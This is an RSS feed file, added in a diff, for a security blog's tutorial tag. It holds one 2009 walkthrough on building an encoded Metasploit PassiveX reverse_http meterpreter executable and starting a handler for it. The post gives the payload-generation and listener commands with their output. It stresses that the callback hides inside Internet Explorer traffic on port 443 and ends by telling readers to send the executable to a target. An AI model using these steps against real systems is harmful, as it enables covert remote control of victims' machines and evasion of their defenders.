@@ -1,0 +1,104 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Tutorial on Room362</title>
+    <link>http://localhost:1313/tags/tutorial/</link>
+    <description>Recent content in Tutorial on Room362</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
+    <lastBuildDate>Wed, 10 Jun 2009 13:21:05 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/tags/tutorial/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>PassiveX fun with Metasploit</title>
+      <link>http://localhost:1313/post/2009/2009610passivex-fun-with-metasploit-html/</link>
+      <pubDate>Wed, 10 Jun 2009 13:21:05 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2009/2009610passivex-fun-with-metasploit-html/</guid>
+      <description>&lt;p&gt;I posted this walkthrough to the Metasploit mailing list, but thought that it would serve well here as well. Especially with the recent iPhone 3.0 “Special” download spam I recently received. The binary comes out to a whopping 97 bytes for the stager. Would be a blazing fast download and coupled with the &lt;a href=&#34;http://localhost:1313/archives/440-metasploit-2.html&#34;&gt;IExpress “hack”&lt;/a&gt; would make for an very hard to spot payload.&lt;/p&gt;
+
+&lt;p&gt;A really down and dirty explination of what PassiveX is and why it&amp;rsquo;s useful in this sort of situation is that instead of making a direct connection back to you, it uses an iexplorer process with a cool ActiveX control to talk back. So someone looking for a rogue process will only see Internet Explorer open and talking over port 443 (as specified).&lt;/p&gt;
+
+&lt;p&gt;(props to skape for writting PassiveX and @&lt;a href=&#34;http://twitter.com/_natron_&#34;&gt;&lt;em&gt;natron&lt;/em&gt;&lt;/a&gt; for kicking in the latest tweaks to make it work with IE7/IE8)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Here are the options for msfpayload:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Usage: ./msfpayload &lt;payload&gt; [var=val] &lt;S[ummary]|C|P[erl]|[Rub]y|R[aw]|J[avascript]|e[X]ecutable|[V]BA&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;And msfencode&amp;rsquo;s options if you chose to use it as I demonstrate below. However, encoding happens by default with msfpayload (IIRC):&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;./msfencode -h&lt;/p&gt;
+
+&lt;p&gt;Usage: ./msfencode &lt;options&gt;&lt;/p&gt;
+
+&lt;p&gt;OPTIONS:&lt;/p&gt;
+
+&lt;p&gt;-a &lt;opt&gt; The architecture to encode as&lt;br /&gt;
+-b &lt;opt&gt; The list of characters to avoid: &amp;lsquo;x00xff&amp;rsquo;&lt;br /&gt;
+-c &lt;opt&gt; The number of times to encode the data&lt;br /&gt;
+-e &lt;opt&gt; The encoder to use&lt;br /&gt;
+-h Help banner&lt;br /&gt;
+-i &lt;opt&gt; Encode the contents of the supplied file path&lt;br /&gt;
+-l List available encoders&lt;br /&gt;
+-m &lt;opt&gt; Specifies an additional module search path&lt;br /&gt;
+-n Dump encoder information&lt;br /&gt;
+-o &lt;opt&gt; The output file&lt;br /&gt;
+-s &lt;opt&gt; The maximum size of the encoded data&lt;br /&gt;
+-t &lt;opt&gt; The format to display the encoded buffer with (c, elf, exe, java, perl, raw, ruby, vba)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Here we create the PassiveX payload. Note the PX options instead of the LHOST/LPORT:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;./msfpayload windows/reflectivemeterpreter/reverse_http PXHOST=192.168.1.100 PXPORT=443 PXURI=/ R | ./msfencode -t exe -o /tmp/maliciouspayload.exe&lt;/p&gt;
+
+&lt;p&gt;[*] x86/shikata_ga_nai succeeded with size 97 (iteration=1)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Now that we have our &amp;ldquo;malicious payload&amp;rdquo; in /tmp we get our listener ready (you can use msfcli as well, I just like msfconsole because it provides me more flexibility):&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;./msfconsole&lt;/p&gt;
+
+&lt;p&gt;_&lt;br /&gt;
+| | o&lt;br /&gt;
+_ _ _ _ &lt;em&gt;|&lt;/em&gt; &lt;strong&gt;, , _ | | __ &lt;em&gt;|&lt;/em&gt;&lt;br /&gt;
+/ |/ |/ | |/ | / | / &lt;em&gt;|/ _|/ / _| |&lt;br /&gt;
+| | |&lt;/em&gt;/|&lt;/strong&gt;/|&lt;em&gt;/&lt;/em&gt;/|&lt;em&gt;/ / |&lt;strong&gt;/ |&lt;/strong&gt;/__/ |&lt;/em&gt;/|_/&lt;br /&gt;
+/|&lt;br /&gt;
+|&lt;/p&gt;
+
+&lt;p&gt;=[ msf v3.3-dev&lt;br /&gt;
++ &amp;ndash; &amp;ndash;=[ 376 exploits - 234 payloads&lt;br /&gt;
++ &amp;ndash; &amp;ndash;=[ 20 encoders - 7 nops&lt;br /&gt;
+=[ 153 aux&lt;/p&gt;
+
+&lt;p&gt;msf &amp;gt; use multi/handler&lt;br /&gt;
+msf exploit(handler) &amp;gt; exploit -h&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;(I&amp;rsquo;m showing you &amp;lsquo;exploit&amp;rsquo;s options because a lot of people don&amp;rsquo;t know they exist. With two lines you can start your listener (use, then exploit):&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Usage: exploit [options]&lt;br /&gt;
+Launches an exploitation attempt.&lt;/p&gt;
+
+&lt;p&gt;OPTIONS:&lt;br /&gt;
+-e &lt;opt&gt; The payload encoder to use. If none is specified, ENCODER is used.&lt;br /&gt;
+-h Help banner.&lt;br /&gt;
+-j Run in the context of a job.&lt;br /&gt;
+-n &lt;opt&gt; The NOP generator to use. If none is specified, NOP is used.&lt;br /&gt;
+-o &lt;opt&gt; A comma separated list of options in VAR=VAL format.&lt;br /&gt;
+-p &lt;opt&gt; The payload to use. If none is specified, PAYLOAD is used.&lt;br /&gt;
+-t &lt;opt&gt; The target index to use. If none is specified, TARGET is used.&lt;br /&gt;
+-z Do not interact with the session after successful exploitation.&lt;/p&gt;
+
+&lt;p&gt;msf exploit(handler) &amp;gt; exploit -j -z -p windows/reflectivemeterpreter/reverse_http -o PXHOST=0.0.0.0,PXPORT=443,PXURI=/,ExitOnSession=False&lt;/p&gt;
+
+&lt;p&gt;[&lt;em&gt;] Exploit running as background job.&lt;br /&gt;
+[&lt;/em&gt;] PassiveX listener started.&lt;br /&gt;
+[*] Starting the payload handler&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;msf exploit(handler) &amp;gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Listener ready to go. I chose IP: 0.0.0.0 just to make things easy. Just send off maliciouspayload.exe to your target and you&amp;rsquo;re set.&lt;/strong&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
